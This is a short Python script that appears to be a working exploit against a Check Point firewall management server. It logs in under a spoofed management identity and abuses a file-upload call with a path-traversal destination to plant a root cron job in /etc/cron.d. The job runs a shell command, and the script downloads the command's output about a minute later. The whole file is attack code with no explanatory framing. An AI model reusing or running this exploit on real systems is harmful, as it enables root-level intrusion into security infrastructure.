import time


def execute(login_service, file_service, server_sic_name):
    session = login_service.loginNew('management,CN=' + server_sic_name)
    destination = '../../../../../../etc/cron.d/raid-check'
    output = '/opt/CPsuite-R82.10/fw1/conf/SMC_Files/result'
    payload = '* * * * * root /bin/sh -c "id > /opt/CPsuite-R82.10/fw1/conf/SMC_Files/result 2>&1"\n'
    file_service.uploadFileToServerFileSystem(session, destination, payload.encode())
    time.sleep(65)
    return file_service.downloadRawFile(session, output)
